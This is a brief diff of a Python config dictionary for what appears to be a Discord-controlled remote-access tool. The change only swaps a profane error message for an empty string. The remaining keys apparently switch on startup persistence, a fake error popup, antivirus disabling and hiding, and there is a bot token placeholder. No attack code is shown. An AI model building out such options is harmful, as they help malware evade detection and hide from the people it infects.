@@ -70,7 +70,7 @@ discord.opus.load_opus(opuslib_path)
 config = {
     "startup": True,
     "error": True,
-    "error_message": "FUCK YOU GO CONTACT SOUL FOR DETAILS BITCH",
+    "error_message": "",
     "disable_av": False,
     "hide": False,
     "token": "Token thing here",
